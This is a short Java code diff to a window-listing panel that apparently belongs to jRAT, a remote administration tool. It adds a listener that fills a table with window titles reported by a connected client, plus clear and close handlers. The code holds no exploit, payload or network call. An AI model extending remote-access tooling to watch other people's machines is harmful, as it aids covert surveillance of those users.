@@ -15,7 +15,7 @@ import jrat.api.Client;
 import jrat.api.ui.BaseControlPanel;
 
 @SuppressWarnings("serial")
-public class WindowPanel extends BaseControlPanel {
+public class WindowPanel extends BaseControlPanel implements NewWindowListener {
 	
 	public static final String COLUMN_WINDOW_TITLE = "Window Title";
 	
@@ -37,6 +37,13 @@ public class WindowPanel extends BaseControlPanel {
 		pane.setViewportView(table);
 		
 		add(pane, BorderLayout.CENTER);
+		
+		ListPacketListener.LISTENERS.add(this);
+	}
+	
+	@Override
+	public void onClose() {
+		ListPacketListener.LISTENERS.remove(this);
 	}
 
 	private class TableModel extends DefaultTableModel {
@@ -73,5 +80,17 @@ public class WindowPanel extends BaseControlPanel {
 			
 			return label;
 		}
+	}
+
+	@Override
+	public void clear() {
+		while (model.getRowCount() > 0) {
+			model.removeRow(0);
+		}
+	}
+
+	@Override
+	public void windowAdded(NativeWindow window) {
+		model.addRow(new Object[] { window });
 	}
 }
